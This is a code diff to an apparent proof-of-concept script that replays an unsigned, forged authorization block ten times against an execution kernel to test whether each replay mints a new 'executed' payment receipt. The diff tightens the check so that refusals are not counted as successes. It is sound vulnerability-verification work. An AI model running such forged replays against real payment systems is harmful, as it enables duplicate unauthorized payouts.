@@ -74,20 +74,32 @@ def main() -> int:
         print(f"Legit execution #0: receipt_id={result1.receipt.receipt_id}, outcome={result1.receipt.outcome}")
 
         forged_pccb = unsigned_pccb_with_action_hash(intent1, context1)
-        receipt_ids = set()
+        successful_receipt_ids: set[str] = set()
         N = 10
         print(f"\nReplaying with an UNSIGNED PCCB {N} times (same operation_id, no valid signature)...")
         for i in range(1, N + 1):
             request_i = ProtectedExecutionRequest(intent=intent1, pccb=forged_pccb, context=context1)
             result_i = executor.execute(request_i, handler)
-            rid = result_i.receipt.receipt_id if result_i.receipt else None
-            receipt_ids.add(rid)
-            print(f"  replay #{i}: refusal={result_i.refusal}, receipt_id={rid}, "
-                  f"outcome={result_i.receipt.outcome if result_i.receipt else None}, "
+            # Only count a replay as a confirmed free payout if it actually
+            # executed successfully with the expected payload — a properly
+            # fixed executor would refuse every one of these (still minting
+            # a distinct refusal artifact each time), and that must NOT be
+            # misread as ten confirmed executions.
+            executed = (
+                result_i.refusal is None
+                and result_i.receipt is not None
+                and result_i.receipt.outcome == "executed"
+                and result_i.payload is not None
+                and result_i.payload.get("amount_minor") == amount
+            )
+            rid = result_i.receipt.receipt_id if (executed and result_i.receipt) else None
+            print(f"  replay #{i}: refusal={result_i.refusal}, executed={executed}, receipt_id={rid}, "
                   f"amount claimed={result_i.payload.get('amount_minor') if result_i.payload else None}")
+            if executed and rid is not None:
+                successful_receipt_ids.add(rid)
 
-        print(f"\nDistinct receipt_ids minted across {N} forged replays: {len(receipt_ids)}")
-        if len(receipt_ids) == N:
+        print(f"\nDistinct SUCCESSFUL receipt_ids minted across {N} forged replays: {len(successful_receipt_ids)}")
+        if len(successful_receipt_ids) == N:
             print(f"[CONFIRMED] Every single forged replay minted a BRAND-NEW, uniquely-numbered")
             print(f"'executed' receipt for {amount} minor units, with NO valid signature checked")
             print(f"after the very first legitimate call. A downstream ledger that credits money")
@@ -95,6 +107,8 @@ def main() -> int:
             print(f"out {N} x {amount} = {N * amount} minor units for ONE real authorization.")
             print(f"This scales with however many requests the attacker is willing to send: UNBOUNDED.")
             return 0
+        print(f"\n[NOT CONFIRMED] Not every forged replay produced a successful, distinct execution "
+              f"receipt — either the kernel refuses forged replays here, or something else changed.")
         return 1
 
 
